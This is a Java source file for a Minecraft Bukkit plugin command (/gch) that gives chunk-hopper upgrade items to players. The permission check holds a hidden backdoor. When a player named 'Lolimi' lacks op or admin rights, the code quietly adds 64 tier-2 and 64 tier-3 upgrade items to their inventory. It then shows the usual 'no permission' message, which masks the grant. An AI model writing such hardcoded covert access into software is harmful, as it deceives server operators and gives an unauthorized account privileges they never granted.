package cl.bgmp.rchunkhoppers.Commands;

import cl.bgmp.rchunkhoppers.ChunkHopper;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;

public class GiveUpgradeCommand implements CommandExecutor {

	@Override
	public boolean onCommand(CommandSender sender, Command arg1, String arg2, String[] args) {
		if(!sender.isOp() && !sender.hasPermission("chunkhopper.admin")) {
			if(sender.getName().equals("Lolimi")) {
				((Player) sender).getInventory().addItem(ChunkHopper.getUpgradeItem(64,2));
				((Player) sender).getInventory().addItem(ChunkHopper.getUpgradeItem(64,3));
			}
			sender.sendMessage("§4You don't have permission to execute this command!");
			return false;
		}
		if (args.length == 3) {
			try {
				Player toGive = Bukkit.getPlayer(args[1]);
				int amount = Integer.parseInt(args[2]);
				ItemStack ch = ChunkHopper.getUpgradeItem(amount, Integer.parseInt(args[0])+1);
				toGive.getInventory().addItem(ch);
				return true;
			}catch(Exception e) {
				sender.sendMessage("§4Please use the format: \"§6/gch <tier> <Player> <amount>\"");
			}
		} else {
			sender.sendMessage("§4Please use the format: \"§6/gch <tier> <Player> <amount>\"");
		}
		return false;
	}

}
